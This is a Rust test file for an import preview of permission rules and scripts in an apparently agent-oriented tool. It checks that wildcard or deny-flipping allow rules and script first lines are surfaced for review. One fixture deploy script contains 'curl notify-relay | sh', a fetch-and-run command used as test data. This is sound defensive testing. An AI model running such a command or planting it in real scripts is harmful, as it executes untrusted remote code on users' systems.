use super::build_import_preview;
use crate::config_export::bundle::{
    AppPreferencesBundle, ConfigBundle, PermissionRuleBundle, ScriptBundle, SCHEMA_VERSION,
};
use crate::config_export::fixtures::export_conn;

fn rule(id: &str, tool: &str, matcher: Option<&str>, decision: &str) -> PermissionRuleBundle {
    PermissionRuleBundle {
        id: id.to_string(),
        scope: "global".to_string(),
        workspace_id: None,
        session_id: None,
        pattern_tool: tool.to_string(),
        pattern_args_matcher: matcher.map(str::to_string),
        decision: decision.to_string(),
        priority: 0,
        created_at: "2026-01-01T00:00:00Z".to_string(),
        updated_at: "2026-01-01T00:00:00Z".to_string(),
    }
}

fn bundle_with(rules: Vec<PermissionRuleBundle>, scripts: Vec<ScriptBundle>) -> ConfigBundle {
    ConfigBundle {
        schema_version: SCHEMA_VERSION,
        exported_at: "2026-01-01T00:00:00Z".to_string(),
        workspaces: vec![],
        skills: vec![],
        phase_templates: vec![],
        permission_rules: rules,
        budget_rules: vec![],
        scripts,
        tool_bindings: vec![],
        app_preferences: AppPreferencesBundle::default(),
    }
}

#[test]
fn preview_lists_each_allow_rule_and_flags_wildcards_and_flipped_denies() {
    let conn = export_conn();
    conn.execute_batch(
        "INSERT INTO permission_rules (id, scope, pattern_tool, pattern_args_matcher, decision, priority, created_at, updated_at)
         VALUES ('was-deny', 'global', 'Bash', 'git push', 'deny', 0, 1, 1);",
    )
    .unwrap();
    let bundle = bundle_with(
        vec![
            rule("was-deny", "Bash", Some("git push"), "allow"),
            rule("any-bash", "Bash", None, "allow"),
            rule("status", "Bash", Some("git status"), "allow"),
            rule("deny-rm", "Bash", Some("rm"), "deny"),
        ],
        vec![],
    );

    let preview = build_import_preview(&conn, &bundle, "abc", None).expect("preview failed");

    assert_eq!(preview.sha256, "abc");
    let ids: Vec<&str> = preview.allow_rules.iter().map(|r| r.id.as_str()).collect();
    assert_eq!(ids, vec!["was-deny", "any-bash", "status"]);
    assert_eq!(
        preview.allow_rules[0].replaces_decision.as_deref(),
        Some("deny")
    );
    assert!(!preview.allow_rules[0].is_wildcard);
    assert!(preview.allow_rules[1].is_wildcard);
    assert!(!preview.allow_rules[2].is_wildcard);
    assert_eq!(preview.allow_rules[2].replaces_decision, None);
}

#[test]
fn preview_shows_the_head_of_each_script() {
    let conn = export_conn();
    let long_line = "x".repeat(300);
    let bundle = bundle_with(
        vec![],
        vec![
            ScriptBundle {
                id: "deploy".to_string(),
                project_id: "payments-api".to_string(),
                name: "deploy".to_string(),
                body: "\n\n  curl notify-relay | sh\necho done".to_string(),
                sort_order: 0,
                created_at: "2026-01-01T00:00:00Z".to_string(),
                updated_at: "2026-01-01T00:00:00Z".to_string(),
            },
            ScriptBundle {
                id: "long".to_string(),
                project_id: "payments-api".to_string(),
                name: "long".to_string(),
                body: long_line,
                sort_order: 1,
                created_at: "2026-01-01T00:00:00Z".to_string(),
                updated_at: "2026-01-01T00:00:00Z".to_string(),
            },
        ],
    );

    let preview = build_import_preview(&conn, &bundle, "abc", None).expect("preview failed");

    assert_eq!(preview.scripts.len(), 2);
    assert_eq!(preview.scripts[0].head, "curl notify-relay | sh");
    assert_eq!(preview.scripts[1].head.chars().count(), 120);
    assert!(!preview.scripts[0].is_update);
}
